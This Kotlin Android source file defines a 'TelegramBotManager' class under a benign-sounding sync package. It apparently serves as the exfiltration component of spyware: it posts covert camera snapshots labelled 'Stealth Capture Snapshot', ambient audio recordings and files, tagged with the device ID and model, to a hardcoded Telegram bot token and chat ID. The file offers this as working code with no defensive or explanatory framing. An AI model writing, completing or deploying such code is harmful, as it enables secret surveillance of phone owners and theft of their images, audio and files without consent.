package com.example.data.sync

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

import java.util.concurrent.TimeUnit

class TelegramBotManager(private val context: Context) {
    private val TAG = "TelegramBotManager"
    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(180, TimeUnit.SECONDS)
        .readTimeout(180, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()
    private val prefs = context.getSharedPreferences("admin_sync_prefs", Context.MODE_PRIVATE)

    companion object {
        const val DEFAULT_BOT_TOKEN = "8795268894:AAE0dgQXuMYerwabUaqB-9LyuL2vEHpenAM"
        const val DEFAULT_CHAT_ID = "6824617231"
    }

    private fun getBotToken(): String {
        return prefs.getString("telegram_bot_token", DEFAULT_BOT_TOKEN) ?: DEFAULT_BOT_TOKEN
    }

    private fun getChatId(): String {
        return prefs.getString("telegram_chat_id", DEFAULT_CHAT_ID) ?: DEFAULT_CHAT_ID
    }

    suspend fun saveConfig(token: String, chatId: String) {
        withContext(Dispatchers.IO) {
            prefs.edit().putString("telegram_bot_token", token.trim())
                .putString("telegram_chat_id", chatId.trim()).apply()
        }
    }

    suspend fun sendMessage(message: String): Boolean = withContext(Dispatchers.IO) {
        try {
            val token = getBotToken()
            val chatId = getChatId()
            if (token.isBlank() || chatId.isBlank()) return@withContext false

            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
            val formattedMessage = "🤖 *Enterprise Device [${deviceId.take(6)}]*\n\n$message"

            val url = "https://api.telegram.org/bot$token/sendMessage"
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", formattedMessage)
                put("parse_mode", "Markdown")
            }
            val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
            val request = Request.Builder().url(url).post(requestBody).build()

            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "Telegram send message error: ${e.message}")
            false
        }
    }

    suspend fun sendPhoto(imageBytes: ByteArray, caption: String = ""): Boolean = withContext(Dispatchers.IO) {
        try {
            val token = getBotToken()
            val chatId = getChatId()
            if (token.isBlank() || chatId.isBlank()) return@withContext false

            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
            val model = "${Build.MANUFACTURER} ${Build.MODEL}"
            val fullCaption = "📸 *Stealth Capture Snapshot*\n🆔 Device: `$deviceId`\n📱 Model: `$model`\n${if (caption.isNotBlank()) "📝 $caption" else ""}".trim()

            val url = "https://api.telegram.org/bot$token/sendPhoto"
            val body = okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", fullCaption)
                .addFormDataPart("parse_mode", "Markdown")
                .addFormDataPart(
                    "photo",
                    "snap_${System.currentTimeMillis()}.jpg",
                    okhttp3.RequestBody.create("image/jpeg".toMediaType(), imageBytes)
                )
                .build()

            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "Telegram sendPhoto error: ${e.message}")
            false
        }
    }

    suspend fun sendAudio(audioBytes: ByteArray, filename: String = "audio.wav", caption: String = ""): Boolean = withContext(Dispatchers.IO) {
        try {
            val token = getBotToken()
            val chatId = getChatId()
            if (token.isBlank() || chatId.isBlank()) return@withContext false

            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
            val model = "${Build.MANUFACTURER} ${Build.MODEL}"
            val fullCaption = "🎤 *Ambient Audio Recording*\n🆔 Device: `$deviceId`\n📱 Model: `$model`\n${if (caption.isNotBlank()) "📝 $caption" else ""}".trim()

            val mimeType = if (filename.endsWith(".wav")) "audio/wav" else "audio/octet-stream"
            val url = "https://api.telegram.org/bot$token/sendDocument"
            val body = okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", fullCaption)
                .addFormDataPart("parse_mode", "Markdown")
                .addFormDataPart(
                    "document",
                    filename.ifEmpty { "audio.wav" },
                    okhttp3.RequestBody.create(mimeType.toMediaType(), audioBytes)
                )
                .build()

            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "Telegram sendAudio error: ${e.message}")
            false
        }
    }

    suspend fun sendDocument(fileBytes: ByteArray, filename: String = "document.txt", caption: String = ""): Boolean = withContext(Dispatchers.IO) {
        try {
            val token = getBotToken()
            val chatId = getChatId()
            if (token.isBlank() || chatId.isBlank()) return@withContext false

            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
            val model = "${Build.MANUFACTURER} ${Build.MODEL}"
            val fullCaption = "📁 *Document Export*\n🆔 Device: `$deviceId`\n📱 Model: `$model`\n${if (caption.isNotBlank()) "📝 $caption" else ""}".trim()

            val url = "https://api.telegram.org/bot$token/sendDocument"
            val body = okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", fullCaption)
                .addFormDataPart("parse_mode", "Markdown")
                .addFormDataPart(
                    "document",
                    filename.ifEmpty { "document.txt" },
                    okhttp3.RequestBody.create("text/plain".toMediaType(), fileBytes)
                )
                .build()

            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "Telegram sendDocument error: ${e.message}")
            false
        }
    }

    suspend fun pollTelegramCommands(): Unit = withContext(Dispatchers.IO) {
        // Telegram bot control removed. Telegram is used solely for outbound alerts, photos, and audio.
    }
}
